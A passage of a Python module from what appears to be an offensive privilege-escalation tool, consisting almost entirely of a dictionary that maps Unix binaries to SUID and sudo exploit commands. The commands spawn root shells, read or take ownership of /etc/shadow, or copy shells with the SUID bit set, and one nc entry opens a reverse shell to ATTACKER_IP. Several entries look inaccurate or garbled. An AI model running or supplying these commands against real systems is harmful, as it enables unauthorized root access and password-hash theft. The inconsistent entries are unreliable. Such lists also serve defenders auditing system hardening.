"""Privilege escalation analysis module with exploit command generation."""

import os
import re
import subprocess

NAME = "privesc"

# GTFOBins dictionary: binary name -> {category, description, exploit_cmd for SUID, sudo_cmd for sudo}
GTFOBINS = {
    "aa-exec": {"category": "Shell", "exploit_cmd": "aa-exec /bin/sh -p", "sudo_cmd": "sudo aa-exec /bin/sh"},
    "ab": {"category": "File read", "exploit_cmd": "ab -p /etc/shadow http://127.0.0.1/", "sudo_cmd": "sudo ab -p /etc/shadow http://127.0.0.1/"},
    "agetty": {"category": "Shell", "exploit_cmd": "agetty -o -p -l /bin/sh -a root tty", "sudo_cmd": "sudo agetty -o -p -l /bin/sh -a root tty"},
    "alpine": {"category": "Shell", "exploit_cmd": "alpine -F \"exec /bin/sh -p\"", "sudo_cmd": "sudo alpine -F \"exec /bin/sh\""},
    "ar": {"category": "File read", "exploit_cmd": "TF=$(mktemp -u); LFILE=/etc/shadow; ar r \"$TF\" \"$LFILE\"; cat \"$TF\"", "sudo_cmd": "TF=$(mktemp -u); LFILE=/etc/shadow; sudo ar r \"$TF\" \"$LFILE\"; cat \"$TF\""},
    "aria2c": {"category": "File write", "exploit_cmd": "aria2c --on-download-error=/bin/sh http://x", "sudo_cmd": "sudo aria2c --on-download-error=/bin/sh http://x"},
    "arj": {"category": "File read", "exploit_cmd": "arj p /etc/shadow", "sudo_cmd": "sudo arj p /etc/shadow"},
    "arp": {"category": "File read", "exploit_cmd": "arp -v -f /etc/shadow", "sudo_cmd": "sudo arp -v -f /etc/shadow"},
    "as": {"category": "File read", "exploit_cmd": "as /etc/shadow", "sudo_cmd": "sudo as /etc/shadow"},
    "ascii-xfr": {"category": "File read", "exploit_cmd": "ascii-xfr -ns /etc/shadow", "sudo_cmd": "sudo ascii-xfr -ns /etc/shadow"},
    "ash": {"category": "Shell", "exploit_cmd": "ash -p", "sudo_cmd": "sudo ash"},
    "aspell": {"category": "File read", "exploit_cmd": "aspell dump config", "sudo_cmd": "sudo aspell dump config"},
    "atobm": {"category": "File read", "exploit_cmd": "atobm /etc/shadow", "sudo_cmd": "sudo atobm /etc/shadow"},
    "awk": {"category": "Shell", "exploit_cmd": "awk 'BEGIN {system(\"/bin/sh -p\")}'", "sudo_cmd": "sudo awk 'BEGIN {system(\"/bin/sh\")}'"},
    "base32": {"category": "File read", "exploit_cmd": "base32 /etc/shadow | base32 -d", "sudo_cmd": "sudo base32 /etc/shadow | base32 -d"},
    "base64": {"category": "File read", "exploit_cmd": "base64 /etc/shadow | base64 -d", "sudo_cmd": "sudo base64 /etc/shadow | base64 -d"},
    "basenc": {"category": "File read", "exploit_cmd": "basenc --base64 /etc/shadow | basenc -d --base64", "sudo_cmd": "sudo basenc --base64 /etc/shadow | basenc -d --base64"},
    "bash": {"category": "Shell", "exploit_cmd": "bash -p", "sudo_cmd": "sudo bash"},
    "bridge": {"category": "File read", "exploit_cmd": "bridge -b /etc/shadow", "sudo_cmd": "sudo bridge -b /etc/shadow"},
    "busctl": {"category": "Shell", "exploit_cmd": "busctl --user set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager NReloading b 1 --address=unixexec:path=/bin/sh,argv1=-p", "sudo_cmd": "sudo busctl --user set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager NReloading b 1 --address=unixexec:path=/bin/sh"},
    "busybox": {"category": "Shell", "exploit_cmd": "busybox sh -p", "sudo_cmd": "sudo busybox sh"},
    "byebug": {"category": "Shell", "exploit_cmd": "TF=$(mktemp); echo 'system(\"/bin/sh -p\")' > $TF; byebug $TF", "sudo_cmd": "TF=$(mktemp); echo 'system(\"/bin/sh\")' > $TF; sudo byebug $TF"},
    "bzip2": {"category": "File read", "exploit_cmd": "bzip2 -c /etc/shadow | bzip2 -d", "sudo_cmd": "sudo bzip2 -c /etc/shadow | bzip2 -d"},
    "capsh": {"category": "Shell", "exploit_cmd": "capsh --gid=0 --uid=0 --", "sudo_cmd": "sudo capsh --gid=0 --uid=0 --"},
    "cat": {"category": "File read", "exploit_cmd": "cat /etc/shadow", "sudo_cmd": "sudo cat /etc/shadow"},
    "chmod": {"category": "SUID", "exploit_cmd": "chmod +s /bin/sh && /bin/sh -p", "sudo_cmd": "sudo chmod +s /bin/sh && /bin/sh -p"},
    "chown": {"category": "SUID", "exploit_cmd": "chown $(id -un):$(id -gn) /etc/shadow", "sudo_cmd": "sudo chown $(id -un):$(id -gn) /etc/shadow"},
    "chroot": {"category": "Shell", "exploit_cmd": "chroot / /bin/sh -p", "sudo_cmd": "sudo chroot / /bin/sh"},
    "cmp": {"category": "File read", "exploit_cmd": "cmp /etc/shadow /dev/null", "sudo_cmd": "sudo cmp /etc/shadow /dev/null"},
    "column": {"category": "File read", "exploit_cmd": "column /etc/shadow", "sudo_cmd": "sudo column /etc/shadow"},
    "comm": {"category": "File read", "exploit_cmd": "comm /etc/shadow /dev/null", "sudo_cmd": "sudo comm /etc/shadow /dev/null"},
    "cobc": {"category": "Shell", "exploit_cmd": "TF=$(mktemp -d); echo 'CALL \"SYSTEM\" USING \"/bin/sh -p\".' > $TF/a.cob; cobc -x -o $TF/a $TF/a.cob; $TF/a", "sudo_cmd": "TF=$(mktemp -d); echo 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/a.cob; sudo cobc -x -o $TF/a $TF/a.cob; $TF/a"},
    "cp": {"category": "SUID", "exploit_cmd": "cp /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p", "sudo_cmd": "sudo cp /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p"},
    "cpan": {"category": "Shell", "exploit_cmd": "cpan\n! exec '/bin/sh -p'", "sudo_cmd": "sudo cpan\n! exec '/bin/sh'"},
    "cpio": {"category": "File read", "exploit_cmd": "echo /etc/shadow | cpio -o | cpio -i --to-stdout", "sudo_cmd": "echo /etc/shadow | sudo cpio -o | cpio -i --to-stdout"},
    "cpulimit": {"category": "Shell", "exploit_cmd": "cpulimit -l 100 -f /bin/sh -p", "sudo_cmd": "sudo cpulimit -l 100 -f /bin/sh"},
    "csh": {"category": "Shell", "exploit_cmd": "csh -b", "sudo_cmd": "sudo csh"},
    "csplit": {"category": "File read", "exploit_cmd": "csplit /etc/shadow 1 && cat xx*", "sudo_cmd": "sudo csplit /etc/shadow 1 && cat xx*"},
    "csvtool": {"category": "Shell", "exploit_cmd": "csvtool call '/bin/sh -p' /etc/passwd", "sudo_cmd": "sudo csvtool call '/bin/sh' /etc/passwd"},
    "curl": {"category": "File read", "exploit_cmd": "curl file:///etc/shadow", "sudo_cmd": "sudo curl file:///etc/shadow"},
    "cut": {"category": "File read", "exploit_cmd": "cut -d '' -f1 /etc/shadow", "sudo_cmd": "sudo cut -d '' -f1 /etc/shadow"},
    "dash": {"category": "Shell", "exploit_cmd": "dash -p", "sudo_cmd": "sudo dash"},
    "date": {"category": "File read", "exploit_cmd": "date -f /etc/shadow", "sudo_cmd": "sudo date -f /etc/shadow"},
    "dd": {"category": "File read", "exploit_cmd": "dd if=/etc/shadow", "sudo_cmd": "sudo dd if=/etc/shadow"},
    "dialog": {"category": "File read", "exploit_cmd": "dialog --textbox /etc/shadow 40 80", "sudo_cmd": "sudo dialog --textbox /etc/shadow 40 80"},
    "diff": {"category": "File read", "exploit_cmd": "diff --line-format=%L /dev/null /etc/shadow", "sudo_cmd": "sudo diff --line-format=%L /dev/null /etc/shadow"},
    "dig": {"category": "File read", "exploit_cmd": "dig -f /etc/shadow", "sudo_cmd": "sudo dig -f /etc/shadow"},
    "dmesg": {"category": "Shell", "exploit_cmd": "dmesg -H\n!/bin/sh -p", "sudo_cmd": "sudo dmesg -H\n!/bin/sh"},
    "docker": {"category": "Shell", "exploit_cmd": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "sudo_cmd": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
    "dpkg": {"category": "Shell", "exploit_cmd": "dpkg -l\n!/bin/sh -p", "sudo_cmd": "sudo dpkg -l\n!/bin/sh"},
    "dvips": {"category": "Shell", "exploit_cmd": "dvips -o '|/bin/sh -p' test.dvi", "sudo_cmd": "sudo dvips -o '|/bin/sh' test.dvi"},
    "easy_install": {"category": "Shell", "exploit_cmd": "TF=$(mktemp -d); echo 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' > $TF/setup.py; easy_install $TF", "sudo_cmd": "TF=$(mktemp -d); echo 'import os; os.execl(\"/bin/sh\", \"sh\")' > $TF/setup.py; sudo easy_install $TF"},
    "eb": {"category": "Shell", "exploit_cmd": "eb logs\n!/bin/sh -p", "sudo_cmd": "sudo eb logs\n!/bin/sh"},
    "ed": {"category": "Shell", "exploit_cmd": "ed\n!/bin/sh -p", "sudo_cmd": "sudo ed\n!/bin/sh"},
    "emacs": {"category": "Shell", "exploit_cmd": "emacs -Q -nw --eval '(term \"/bin/sh -p\")'", "sudo_cmd": "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"},
    "env": {"category": "Shell", "exploit_cmd": "env /bin/sh -p", "sudo_cmd": "sudo env /bin/sh"},
    "eqn": {"category": "File read", "exploit_cmd": "eqn /etc/shadow", "sudo_cmd": "sudo eqn /etc/shadow"},
    "expand": {"category": "File read", "exploit_cmd": "expand /etc/shadow", "sudo_cmd": "sudo expand /etc/shadow"},
    "expect": {"category": "Shell", "exploit_cmd": "expect -c 'spawn /bin/sh -p; interact'", "sudo_cmd": "sudo expect -c 'spawn /bin/sh; interact'"},
    "facter": {"category": "Shell", "exploit_cmd": "TF=$(mktemp -d); echo 'exec(\"/bin/sh -p\")' > $TF/x.rb; FACTERLIB=$TF facter", "sudo_cmd": "TF=$(mktemp -d); echo 'exec(\"/bin/sh\")' > $TF/x.rb; FACTERLIB=$TF sudo facter"},
    "file": {"category": "File read", "exploit_cmd": "file -f /etc/shadow", "sudo_cmd": "sudo file -f /etc/shadow"},
    "find": {"category": "Shell", "exploit_cmd": "find . -exec /bin/sh -p \\; -quit", "sudo_cmd": "sudo find . -exec /bin/sh \\; -quit"},
    "fish": {"category": "Shell", "exploit_cmd": "fish", "sudo_cmd": "sudo fish"},
    "flock": {"category": "Shell", "exploit_cmd": "flock -u / /bin/sh -p", "sudo_cmd": "sudo flock -u / /bin/sh"},
    "fmt": {"category": "File read", "exploit_cmd": "fmt -999 /etc/shadow", "sudo_cmd": "sudo fmt -999 /etc/shadow"},
    "fold": {"category": "File read", "exploit_cmd": "fold -w99999 /etc/shadow", "sudo_cmd": "sudo fold -w99999 /etc/shadow"},
    "ftp": {"category": "Shell", "exploit_cmd": "ftp\n!/bin/sh -p", "sudo_cmd": "sudo ftp\n!/bin/sh"},
    "gawk": {"category": "Shell", "exploit_cmd": "gawk 'BEGIN {system(\"/bin/sh -p\")}'", "sudo_cmd": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"},
    "gcc": {"category": "Shell", "exploit_cmd": "gcc -wrapper /bin/sh,-p,-s .", "sudo_cmd": "sudo gcc -wrapper /bin/sh,-s ."},
    "gdb": {"category": "Shell", "exploit_cmd": "gdb -nx -ex '!sh -p' -ex quit", "sudo_cmd": "sudo gdb -nx -ex '!sh' -ex quit"},
    "gem": {"category": "Shell", "exploit_cmd": "gem open -e \"/bin/sh -p -c /bin/sh -p\" rdoc", "sudo_cmd": "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"},
    "gimp": {"category": "Shell", "exploit_cmd": "gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'", "sudo_cmd": "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\")'"},
    "git": {"category": "Shell", "exploit_cmd": "git help config\n!/bin/sh -p", "sudo_cmd": "sudo git help config\n!/bin/sh"},
    "grep": {"category": "File read", "exploit_cmd": "grep '' /etc/shadow", "sudo_cmd": "sudo grep '' /etc/shadow"},
    "gtester": {"category": "Shell", "exploit_cmd": "TF=$(mktemp); echo '#!/bin/sh -p' > $TF; chmod +x $TF; gtester -e $TF", "sudo_cmd": "TF=$(mktemp); echo '#!/bin/sh' > $TF; chmod +x $TF; sudo gtester -e $TF"},
    "gzip": {"category": "File read", "exploit_cmd": "gzip -f /etc/shadow -t", "sudo_cmd": "sudo gzip -f /etc/shadow -t"},
    "hd": {"category": "File read", "exploit_cmd": "hd /etc/shadow", "sudo_cmd": "sudo hd /etc/shadow"},
    "head": {"category": "File read", "exploit_cmd": "head -c1G /etc/shadow", "sudo_cmd": "sudo head -c1G /etc/shadow"},
    "hexdump": {"category": "File read", "exploit_cmd": "hexdump -C /etc/shadow", "sudo_cmd": "sudo hexdump -C /etc/shadow"},
    "highlight": {"category": "File read", "exploit_cmd": "highlight --no-doc --failsafe /etc/shadow", "sudo_cmd": "sudo highlight --no-doc --failsafe /etc/shadow"},
    "iconv": {"category": "File read", "exploit_cmd": "iconv -f 8859_1 -t 8859_1 /etc/shadow", "sudo_cmd": "sudo iconv -f 8859_1 -t 8859_1 /etc/shadow"},
    "iftop": {"category": "Shell", "exploit_cmd": "iftop\n!/bin/sh -p", "sudo_cmd": "sudo iftop\n!/bin/sh"},
    "install": {"category": "SUID", "exploit_cmd": "TF=$(mktemp); install -m =xs $(which bash) $TF; $TF -p", "sudo_cmd": "TF=$(mktemp); sudo install -m =xs $(which bash) $TF; $TF -p"},
    "ionice": {"category": "Shell", "exploit_cmd": "ionice /bin/sh -p", "sudo_cmd": "sudo ionice /bin/sh"},
    "ip": {"category": "File read", "exploit_cmd": "ip -force -batch /etc/shadow", "sudo_cmd": "sudo ip -force -batch /etc/shadow"},
    "irb": {"category": "Shell", "exploit_cmd": "irb\nexec '/bin/sh -p'", "sudo_cmd": "sudo irb\nexec '/bin/sh'"},
    "ispell": {"category": "Shell", "exploit_cmd": "ispell /etc/passwd\n!/bin/sh -p", "sudo_cmd": "sudo ispell /etc/passwd\n!/bin/sh"},
    "jjs": {"category": "Shell", "exploit_cmd": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -p')\" | jjs", "sudo_cmd": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh')\" | sudo jjs"},
    "join": {"category": "File read", "exploit_cmd": "join -a 2 /dev/null /etc/shadow", "sudo_cmd": "sudo join -a 2 /dev/null /etc/shadow"},
    "journalctl": {"category": "Shell", "exploit_cmd": "journalctl\n!/bin/sh -p", "sudo_cmd": "sudo journalctl\n!/bin/sh"},
    "jq": {"category": "File read", "exploit_cmd": "jq -Rr . /etc/shadow", "sudo_cmd": "sudo jq -Rr . /etc/shadow"},
    "jrunscript": {"category": "Shell", "exploit_cmd": "jrunscript -e \"exec('/bin/sh -p')\"", "sudo_cmd": "sudo jrunscript -e \"exec('/bin/sh')\""},
    "ksh": {"category": "Shell", "exploit_cmd": "ksh -p", "sudo_cmd": "sudo ksh"},
    "ksshell": {"category": "Shell", "exploit_cmd": "ksshell -i /bin/sh -p", "sudo_cmd": "sudo ksshell -i /bin/sh"},
    "kubectl": {"category": "Shell", "exploit_cmd": "kubectl exec -it pod -- /bin/sh -p", "sudo_cmd": "sudo kubectl exec -it pod -- /bin/sh"},
    "latex": {"category": "File read", "exploit_cmd": "latex '\\input{/etc/shadow}'", "sudo_cmd": "sudo latex '\\input{/etc/shadow}'"},
    "ldconfig": {"category": "Shell", "exploit_cmd": "TF=$(mktemp -d); echo '/tmp' > $TF/x; ldconfig -f $TF/x", "sudo_cmd": "TF=$(mktemp -d); echo '/tmp' > $TF/x; sudo ldconfig -f $TF/x"},
    "less": {"category": "Shell", "exploit_cmd": "less /etc/shadow\n!/bin/sh -p", "sudo_cmd": "sudo less /etc/shadow\n!/bin/sh"},
    "logsave": {"category": "Shell", "exploit_cmd": "logsave /dev/null /bin/sh -p", "sudo_cmd": "sudo logsave /dev/null /bin/sh"},
    "look": {"category": "File read", "exploit_cmd": "look '' /etc/shadow", "sudo_cmd": "sudo look '' /etc/shadow"},
    "ltrace": {"category": "Shell", "exploit_cmd": "ltrace -b -L /bin/sh -p", "sudo_cmd": "sudo ltrace -b -L /bin/sh"},
    "lua": {"category": "Shell", "exploit_cmd": "lua -e 'os.execute(\"/bin/sh -p\")'", "sudo_cmd": "sudo lua -e 'os.execute(\"/bin/sh\")'"},
    "make": {"category": "Shell", "exploit_cmd": "COMMAND='/bin/sh -p' make -s --eval=$'x:\\n\\t-$(COMMAND)'", "sudo_cmd": "COMMAND='/bin/sh' sudo make -s --eval=$'x:\\n\\t-$(COMMAND)'"},
    "man": {"category": "Shell", "exploit_cmd": "man man\n!/bin/sh -p", "sudo_cmd": "sudo man man\n!/bin/sh"},
    "mawk": {"category": "Shell", "exploit_cmd": "mawk 'BEGIN {system(\"/bin/sh -p\")}'", "sudo_cmd": "sudo mawk 'BEGIN {system(\"/bin/sh\")}'"},
    "more": {"category": "Shell", "exploit_cmd": "more /etc/shadow\n!/bin/sh -p", "sudo_cmd": "sudo more /etc/shadow\n!/bin/sh"},
    "mount": {"category": "Shell", "exploit_cmd": "mount -o bind /bin/sh /bin/mount; mount", "sudo_cmd": "sudo mount -o bind /bin/sh /bin/mount; sudo mount"},
    "mtr": {"category": "File read", "exploit_cmd": "mtr --raw -F /etc/shadow", "sudo_cmd": "sudo mtr --raw -F /etc/shadow"},
    "mv": {"category": "SUID", "exploit_cmd": "mv /bin/sh /bin/mv; /bin/mv -p", "sudo_cmd": "sudo mv /etc/sudoers /tmp/; sudo mv /tmp/sudoers.bak /etc/sudoers"},
    "mysql": {"category": "Shell", "exploit_cmd": "mysql -e '\\! /bin/sh -p'", "sudo_cmd": "sudo mysql -e '\\! /bin/sh'"},
    "nano": {"category": "Shell", "exploit_cmd": "nano\n^R^X\nreset; sh -p 1>&0 2>&0", "sudo_cmd": "sudo nano\n^R^X\nreset; sh 1>&0 2>&0"},
    "nasm": {"category": "File read", "exploit_cmd": "nasm -e /etc/shadow", "sudo_cmd": "sudo nasm -e /etc/shadow"},
    "nawk": {"category": "Shell", "exploit_cmd": "nawk 'BEGIN {system(\"/bin/sh -p\")}'", "sudo_cmd": "sudo nawk 'BEGIN {system(\"/bin/sh\")}'"},
    "nc": {"category": "Shell", "exploit_cmd": "nc -e /bin/sh -p ATTACKER_IP 4444", "sudo_cmd": "sudo nc -e /bin/sh ATTACKER_IP 4444"},
    "nice": {"category": "Shell", "exploit_cmd": "nice /bin/sh -p", "sudo_cmd": "sudo nice /bin/sh"},
    "nl": {"category": "File read", "exploit_cmd": "nl -ba /etc/shadow", "sudo_cmd": "sudo nl -ba /etc/shadow"},
    "nmap": {"category": "Shell", "exploit_cmd": "TF=$(mktemp); echo 'os.execute(\"/bin/sh -p\")' > $TF; nmap --script=$TF", "sudo_cmd": "TF=$(mktemp); echo 'os.execute(\"/bin/sh\")' > $TF; sudo nmap --script=$TF"},
    "node": {"category": "Shell", "exploit_cmd": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0,1,2]})'", "sudo_cmd": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0,1,2]})'"},
    "nohup": {"category": "Shell", "exploit_cmd": "nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\"", "sudo_cmd": "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""},
    "npm": {"category": "Shell", "exploit_cmd": "TF=$(mktemp -d); echo '{\"scripts\": {\"x\": \"/bin/sh -p\"}}' > $TF/package.json; npm --prefix $TF run x", "sudo_cmd": "TF=$(mktemp -d); echo '{\"scripts\": {\"x\": \"/bin/sh\"}}' > $TF/package.json; sudo npm --prefix $TF run x"},
    "nsenter": {"category": "Shell", "exploit_cmd": "nsenter /bin/sh -p", "sudo_cmd": "sudo nsenter /bin/sh"},
    "od": {"category": "File read", "exploit_cmd": "od -An -c /etc/shadow", "sudo_cmd": "sudo od -An -c /etc/shadow"},
    "openssl": {"category": "File read", "exploit_cmd": "openssl enc -in /etc/shadow", "sudo_cmd": "sudo openssl enc -in /etc/shadow"},
    "openvpn": {"category": "Shell", "exploit_cmd": "openvpn --dev null --script-security 2 --up '/bin/sh -p'", "sudo_cmd": "sudo openvpn --dev null --script-security 2 --up '/bin/sh'"},
    "paste": {"category": "File read", "exploit_cmd": "paste /etc/shadow", "sudo_cmd": "sudo paste /etc/shadow"},
    "perf": {"category": "Shell", "exploit_cmd": "perf stat /bin/sh -p", "sudo_cmd": "sudo perf stat /bin/sh"},
    "perl": {"category": "Shell", "exploit_cmd": "perl -e 'exec \"/bin/sh -p\";'", "sudo_cmd": "sudo perl -e 'exec \"/bin/sh\";'"},
    "pg": {"category": "Shell", "exploit_cmd": "pg /etc/passwd\n!/bin/sh -p", "sudo_cmd": "sudo pg /etc/passwd\n!/bin/sh"},
    "php": {"category": "Shell", "exploit_cmd": "php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'", "sudo_cmd": "sudo php -r 'pcntl_exec(\"/bin/sh\", []);'"},
    "pic": {"category": "Shell", "exploit_cmd": "pic\n.PS\nsh X sh -p X", "sudo_cmd": "sudo pic\n.PS\nsh X sh X"},
    "pico": {"category": "Shell", "exploit_cmd": "pico\n^R^X\nreset; sh -p 1>&0 2>&0", "sudo_cmd": "sudo pico\n^R^X\nreset; sh 1>&0 2>&0"},
    "pip": {"category": "Shell", "exploit_cmd": "TF=$(mktemp -d); echo 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' > $TF/setup.py; pip install $TF", "sudo_cmd": "TF=$(mktemp -d); echo 'import os; os.execl(\"/bin/sh\", \"sh\")' > $TF/setup.py; sudo pip install $TF"},
    "pkexec": {"category": "Shell", "exploit_cmd": "pkexec /bin/sh (or CVE-2021-4034 PwnKit)", "sudo_cmd": "sudo pkexec /bin/sh"},
    "pr": {"category": "File read", "exploit_cmd": "pr -T /etc/shadow", "sudo_cmd": "sudo pr -T /etc/shadow"},
    "pry": {"category": "Shell", "exploit_cmd": "pry\nsystem('/bin/sh -p')", "sudo_cmd": "sudo pry\nsystem('/bin/sh')"},
    "psql": {"category": "Shell", "exploit_cmd": "psql -c '\\! /bin/sh -p'", "sudo_cmd": "sudo psql -c '\\! /bin/sh'"},
    "puppet": {"category": "Shell", "exploit_cmd": "puppet apply -e 'exec { \"/bin/sh -p\": }'", "sudo_cmd": "sudo puppet apply -e 'exec { \"/bin/sh\": }'"},
    "python": {"category": "Shell", "exploit_cmd": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'", "sudo_cmd": "sudo python -c 'import os; os.execl(\"/bin/sh\", \"sh\")'"},
    "python3": {"category": "Shell", "exploit_cmd": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'", "sudo_cmd": "sudo python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\")'"},
    "rake": {"category": "Shell", "exploit_cmd": "rake -p '`/bin/sh -p 1>&0`'", "sudo_cmd": "sudo rake -p '`/bin/sh 1>&0`'"},
    "readelf": {"category": "File read", "exploit_cmd": "readelf -a @/etc/shadow", "sudo_cmd": "sudo readelf -a @/etc/shadow"},
    "red": {"category": "Shell", "exploit_cmd": "red\n!/bin/sh -p", "sudo_cmd": "sudo red\n!/bin/sh"},
    "redcarpet": {"category": "File read", "exploit_cmd": "redcarpet /etc/shadow", "sudo_cmd": "sudo redcarpet /etc/shadow"},
    "restic": {"category": "File read", "exploit_cmd": "restic backup -r /tmp/backup -o sftp.command='/bin/sh -p' /etc/shadow", "sudo_cmd": "sudo restic backup -r /tmp/backup -o sftp.command='/bin/sh' /etc/shadow"},
    "rev": {"category": "File read", "exploit_cmd": "rev /etc/shadow | rev", "sudo_cmd": "sudo rev /etc/shadow | rev"},
    "rlwrap": {"category": "Shell", "exploit_cmd": "rlwrap /bin/sh -p", "sudo_cmd": "sudo rlwrap /bin/sh"},
    "rpm": {"category": "Shell", "exploit_cmd": "rpm --eval '%{lua:os.execute(\"/bin/sh -p\")}'", "sudo_cmd": "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"},
    "rpmquery": {"category": "Shell", "exploit_cmd": "rpmquery --eval '%{lua:os.execute(\"/bin/sh -p\")}'", "sudo_cmd": "sudo rpmquery --eval '%{lua:os.execute(\"/bin/sh\")}'"},
    "rsync": {"category": "Shell", "exploit_cmd": "rsync -e 'sh -p -c \"sh -p 0<&2 1>&2\"' 127.0.0.1:/dev/null", "sudo_cmd": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"},
    "ruby": {"category": "Shell", "exploit_cmd": "ruby -e 'exec \"/bin/sh -p\"'", "sudo_cmd": "sudo ruby -e 'exec \"/bin/sh\"'"},
    "run-parts": {"category": "Shell", "exploit_cmd": "run-parts --new-session --regex '^sh$' /bin --arg '-p'", "sudo_cmd": "sudo run-parts --new-session --regex '^sh$' /bin"},
    "rview": {"category": "Shell", "exploit_cmd": "rview -c ':!/bin/sh -p'", "sudo_cmd": "sudo rview -c ':!/bin/sh'"},
    "rvim": {"category": "Shell", "exploit_cmd": "rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'", "sudo_cmd": "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\")'"},
    "sash": {"category": "Shell", "exploit_cmd": "sash", "sudo_cmd": "sudo sash"},
    "scanmem": {"category": "Shell", "exploit_cmd": "scanmem\nshell /bin/sh -p", "sudo_cmd": "sudo scanmem\nshell /bin/sh"},
    "scp": {"category": "Shell", "exploit_cmd": "TF=$(mktemp); echo '/bin/sh -p 0<&2 1>&2' > $TF; chmod +x $TF; scp -S $TF x y:", "sudo_cmd": "TF=$(mktemp); echo '/bin/sh 0<&2 1>&2' > $TF; chmod +x $TF; sudo scp -S $TF x y:"},
    "screen": {"category": "Shell", "exploit_cmd": "screen /bin/sh -p", "sudo_cmd": "sudo screen /bin/sh"},
    "script": {"category": "Shell", "exploit_cmd": "script -q /dev/null /bin/sh -p", "sudo_cmd": "sudo script -q /dev/null /bin/sh"},
    "sed": {"category": "Shell", "exploit_cmd": "sed -n '1e exec sh -p 1>&0' /etc/hosts", "sudo_cmd": "sudo sed -n '1e exec sh 1>&0' /etc/hosts"},
    "service": {"category": "Shell", "exploit_cmd": "service ../../bin/sh -p", "sudo_cmd": "sudo service ../../bin/sh"},
    "setarch": {"category": "Shell", "exploit_cmd": "setarch $(arch) /bin/sh -p", "sudo_cmd": "sudo setarch $(arch) /bin/sh"},
    "sftp": {"category": "Shell", "exploit_cmd": "sftp -o ProxyCommand=';sh -p 0<&2 1>&2' x", "sudo_cmd": "sudo sftp -o ProxyCommand=';sh 0<&2 1>&2' x"},
    "shuf": {"category": "File read", "exploit_cmd": "shuf /etc/shadow", "sudo_cmd": "sudo shuf /etc/shadow"},
    "smbclient": {"category": "Shell", "exploit_cmd": "smbclient '\\\\x\\x'\n!/bin/sh -p", "sudo_cmd": "sudo smbclient '\\\\x\\x'\n!/bin/sh"},
    "socat": {"category": "Shell", "exploit_cmd": "socat stdin exec:/bin/sh,-p", "sudo_cmd": "sudo socat stdin exec:/bin/sh"},
    "sort": {"category": "File read", "exploit_cmd": "sort -m /etc/shadow", "sudo_cmd": "sudo sort -m /etc/shadow"},
    "split": {"category": "File read", "exploit_cmd": "split /etc/shadow out && cat out*", "sudo_cmd": "sudo split /etc/shadow out && cat out*"},
    "sqlite3": {"category": "Shell", "exploit_cmd": "sqlite3 /dev/null '.shell /bin/sh -p'", "sudo_cmd": "sudo sqlite3 /dev/null '.shell /bin/sh'"},
    "ss": {"category": "File read", "exploit_cmd": "ss -a -F /etc/shadow", "sudo_cmd": "sudo ss -a -F /etc/shadow"},
    "ssh": {"category": "Shell", "exploit_cmd": "ssh -o ProxyCommand=';sh -p 0<&2 1>&2' x", "sudo_cmd": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"},
    "start-stop-daemon": {"category": "Shell", "exploit_cmd": "start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p", "sudo_cmd": "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"},
    "stdbuf": {"category": "Shell", "exploit_cmd": "stdbuf -i0 /bin/sh -p", "sudo_cmd": "sudo stdbuf -i0 /bin/sh"},
    "strace": {"category": "Shell", "exploit_cmd": "strace -o /dev/null /bin/sh -p", "sudo_cmd": "sudo strace -o /dev/null /bin/sh"},
    "strings": {"category": "File read", "exploit_cmd": "strings /etc/shadow", "sudo_cmd": "sudo strings /etc/shadow"},
    "su": {"category": "Shell", "exploit_cmd": "su", "sudo_cmd": "sudo su"},
    "sysctl": {"category": "File read", "exploit_cmd": "sysctl -n /../../etc/shadow", "sudo_cmd": "sudo sysctl -n /../../etc/shadow"},
    "systemctl": {"category": "Shell", "exploit_cmd": "systemctl\n!sh -p", "sudo_cmd": "sudo systemctl\n!sh"},
    "tac": {"category": "File read", "exploit_cmd": "tac /etc/shadow", "sudo_cmd": "sudo tac /etc/shadow"},
    "tail": {"category": "File read", "exploit_cmd": "tail /etc/shadow", "sudo_cmd": "sudo tail /etc/shadow"},
    "tar": {"category": "Shell", "exploit_cmd": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", "sudo_cmd": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"},
    "taskset": {"category": "Shell", "exploit_cmd": "taskset 1 /bin/sh -p", "sudo_cmd": "sudo taskset 1 /bin/sh"},
    "tclsh": {"category": "Shell", "exploit_cmd": "tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr", "sudo_cmd": "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr"},
